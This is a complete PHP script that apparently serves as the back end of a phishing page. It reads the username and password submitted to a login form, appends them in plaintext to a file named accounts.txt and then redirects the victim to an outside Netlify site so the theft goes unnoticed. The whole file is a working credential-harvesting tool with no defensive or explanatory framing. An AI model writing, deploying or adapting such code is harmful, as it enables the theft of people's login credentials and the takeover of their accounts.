<?php
if(isset($_POST['login-btn']))
    {
    $username = $_POST['Username'];
    $password = $_POST['Password'];
    $text = $username . "," . $password . "\n";
    $fp = fopen('accounts.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'Saved';
    }
fclose ($fp);
header("Location: https://hilarious-pudding-a4e86d.netlify.app/");
die();
}?>